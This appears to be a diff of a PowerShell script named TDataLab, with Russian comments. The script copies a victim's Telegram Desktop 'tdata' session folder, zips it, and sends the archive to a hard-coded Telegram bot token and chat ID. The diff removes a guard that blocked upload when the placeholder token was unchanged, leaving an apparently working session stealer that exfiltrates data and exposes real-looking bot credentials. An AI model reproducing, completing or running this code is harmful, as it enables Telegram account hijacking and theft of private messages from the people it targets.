@@ -6,8 +6,8 @@ $script:Config = @{
     TempCopyDir   = "$env:TEMP\TDATA_Temp_$(Get-Random)"
 
     EnableUpload  = $true
-    BotToken      = "8664245801:AAEAamU5KTWBGVYjeWBexKExYxX4Q0FmSx0"   # <--- СЮДА ВАШ ТОКЕН
-    ChatId        = "243855738"              # <--- СЮДА ВАШ ID (ТОЛЬКО ЦИФРЫ)
+    BotToken      = "8664245801:AAEAamU5KTWBGVYjeWBexKExYxX4Q0FmSx0"
+    ChatId        = "243855738"
 
     IncludeLog    = $true
 }
@@ -22,7 +22,7 @@ function Write-Log {
     Write-Host $logEntry
 }
 
-# === ОТПРАВКА В TELEGRAM ===
+# === ОТПРАВКА В TELEGRAM (ИСПРАВЛЕННАЯ) ===
 function Send-ToTelegram {
     param([string]$FilePath, [string]$Caption = "TDataLab отчет")
     
@@ -31,11 +31,17 @@ function Send-ToTelegram {
         return $false
     }
     
-    if ($script:Config.BotToken -eq "8758309835:AAHvUtDO9paNlC-F-1ojxw2aYuxIpqJpivQ" -or 
-        $script:Config.ChatId -eq "243855738") {
-        Write-Log "Token или Chat ID не изменены. Отправка отключена." "WARN"
+    # Проверяем, что токен и chat ID заданы
+    if ([string]::IsNullOrEmpty($script:Config.BotToken) -or $script:Config.BotToken -eq "") {
+        Write-Log "Токен бота не задан. Отправка отключена." "WARN"
         return $false
     }
+    if ([string]::IsNullOrEmpty($script:Config.ChatId) -or $script:Config.ChatId -eq "") {
+        Write-Log "Chat ID не задан. Отправка отключена." "WARN"
+        return $false
+    }
+
+    Write-Log "Пытаюсь отправить файл в Telegram..." "INFO"
 
     try {
         $uri = "https://api.telegram.org/bot$($script:Config.BotToken)/sendDocument"
@@ -108,7 +114,6 @@ function Compress-Folder {
     try {
         Add-Type -AssemblyName System.IO.Compression.FileSystem
         
-        # Если нужно включить лог в архив
         if ($script:Config.IncludeLog -and (Test-Path $LogPath)) {
             Copy-Item -Path $LogPath -Destination "$SourcePath\TDataLab.log" -Force
             Write-Log "Лог скопирован в архив" "INFO"
@@ -135,23 +140,20 @@ function Cleanup {
 # === ГЛАВНЫЙ ПРОЦЕСС ===
 function Start-TDataLab {
     Write-Log "=========================================" "INFO"
-    Write-Log "TDataLab v3 запущен." "INFO"
+    Write-Log "TDataLab v3.1 запущен." "INFO"
     Write-Log "=========================================" "INFO"
 
-    # Проверяем папку tdata
     $tdataPath = $script:Config.TDataPath
     if (-not (Test-Path $tdataPath)) {
-        Write-Log "Папка tdata не найдена. Telegram установлен?" "ERROR"
+        Write-Log "Папка tdata не найдена." "ERROR"
         return
     }
 
-    # Создаём временную папку
     $tempCopy = $script:Config.TempCopyDir
     if (Test-Path $tempCopy) { Remove-Item $tempCopy -Recurse -Force }
     New-Item -ItemType Directory -Path $tempCopy -Force | Out-Null
     Write-Log "Временная папка: $tempCopy" "INFO"
 
-    # Копируем файлы
     $result = Copy-AvailableFiles -SourcePath $tdataPath -DestPath $tempCopy
     if ($result.Copied -eq 0) {
         Write-Log "Не скопировано ни одного файла." "ERROR"
@@ -159,11 +161,9 @@ function Start-TDataLab {
         return
     }
 
-    # Архивируем
     $zipFullPath = Join-Path $script:Config.OutputDir $script:Config.ZipName
     $compressOk = Compress-Folder -SourcePath $tempCopy -ZipPath $zipFullPath -LogPath $script:Config.LogFile
 
-    # Удаляем временную папку
     Cleanup -Path $tempCopy
 
     if ($compressOk) {
@@ -173,7 +173,6 @@ function Start-TDataLab {
         Write-Log "Пропущено: $($result.Skipped) файлов" "WARN"
         Write-Log "=========================================" "INFO"
         
-        # Отправка в Telegram
         if ($script:Config.EnableUpload) {
             $caption = "TDataLab от $(Get-Date -Format 'yyyy-MM-dd HH:mm')`nСкопировано: $($result.Copied)`nПропущено: $($result.Skipped)"
             Send-ToTelegram -FilePath $zipFullPath -Caption $caption
@@ -183,5 +182,4 @@ function Start-TDataLab {
     }
 }
 
-# === ЗАПУСК ===
 Start-TDataLab
